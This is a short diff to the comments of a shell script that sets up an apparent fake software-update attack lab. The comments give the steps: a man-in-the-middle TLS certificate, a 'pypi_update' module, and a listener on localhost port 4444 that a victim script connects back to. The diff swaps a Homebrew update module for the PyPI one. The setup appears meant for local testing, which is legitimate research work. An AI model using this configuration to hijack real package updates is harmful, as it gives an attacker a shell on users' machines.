@@ -16,15 +16,14 @@
 # Then, inside the shell:
 #   set sslport 9443          (match the port you passed, or leave 443)
 #   set sslcert certs/emudhra_mitm
-#   configure homebrew_update
+#   configure pypi_update
 #   set lhost 127.0.0.1
 #   set lport 4444
 #   set enable 1
 #   configure                 (bare -> back to top level)
 #   start
 #
-# Leave this running; drive the victim from another console with
-# victim_brew.sh / victim_pip.sh.
+# Leave this running; drive the victim from another console with victim_pip.sh.
 ###############################################################################
 cd "$(dirname "$0")/../.." || exit 1
 PORT="${1:-}"
